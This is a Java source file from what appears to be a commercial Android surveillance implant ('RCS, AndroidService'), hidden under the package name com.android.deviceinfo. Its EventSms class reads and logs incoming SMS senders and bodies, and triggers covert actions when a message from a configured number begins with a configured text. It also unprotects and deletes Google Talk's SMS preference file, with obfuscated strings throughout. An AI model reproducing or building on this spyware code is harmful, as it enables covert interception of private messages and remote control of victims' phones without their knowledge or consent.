/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventSms.java
 * Created      : 6-mag-2011
 * Author		: zeno -> mica vero! Que!!! -> per l'header e' vero. Z. ;)
 * *******************************************/

package com.android.deviceinfo.event;

import java.io.File;

import org.w3c.dom.ProcessingInstruction;

import com.android.deviceinfo.ProcessInfo;
import com.android.deviceinfo.ProcessStatus;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfEvent;
import com.android.deviceinfo.conf.ConfigurationException;
import com.android.deviceinfo.file.AutoFile;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.interfaces.Observer;
import com.android.deviceinfo.listener.BSm;
import com.android.deviceinfo.listener.ListenerProcess;
import com.android.deviceinfo.listener.ListenerSms;
import com.android.deviceinfo.module.ProcessObserver;
import com.android.deviceinfo.module.message.Sms;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.StringUtils;
import com.android.m.M;

public class EventSms extends BaseEvent implements Observer<Sms> {
	/** The Constant TAG. */
	private static final String TAG = "EventSms"; //$NON-NLS-1$

	private int actionOnEnter;
	private String number, msg;

	//private ProcessObserver processObserver;

	@Override
	public void actualStart() {
		ListenerSms.self().attach(this);
		//processObserver = new ProcessObserver(this);
		//ListenerProcess.self().attach(processObserver);
	}

	@Override
	public void actualStop() {
		ListenerSms.self().detach(this);
		//ListenerProcess.self().detach(processObserver);
	}

	@Override
	public boolean parse(ConfEvent conf) {
		try {
			number = conf.getString(M.e("number"));
			msg = conf.getString(M.e("text")).toLowerCase();
			
			BSm.memorize(number, msg);

		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
			}
			return false;
		}

		return true;
	}

	@Override
	public void actualGo() {
		
	}
	
	@Override
	public void notifyProcess(ProcessInfo b) {
		if(b.status == ProcessStatus.STOP && b.processInfo.contains(M.e("com.google.android.talk"))){
			String xmlPath = M.e("/data/data/com.google.android.talk/shared_prefs/smsmms.xml");
			Path.unprotect(xmlPath);
			AutoFile file = new AutoFile(xmlPath);
			byte[] data = file.read();
			if(data==null)
				return;
			String content = new String(data);
			if(!StringUtils.isEmpty(content))
			if(content.contains(M.e("<boolean name=\"enable_smsmms_key\" value=\"true\""))){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notifyProcess) Bad value!");
				}
				file.delete();
			}
		}
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Sms s) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());//$NON-NLS-1$ //$NON-NLS-2$
		}
		
		if(!isInteresting(s, this.number, this.msg)){
			return 0;
		}

		onEnter();
		onExit();

		return 1;
	}

	public static boolean isInteresting(Sms s, String number, String msg) {
		if (s.getAddress().toLowerCase().endsWith(number) == false) {
			return false;
		}

		// Case insensitive
		if (s.getBody().toLowerCase().startsWith(msg) == false) {
			return false;
		}
		
		return true;
	}
}
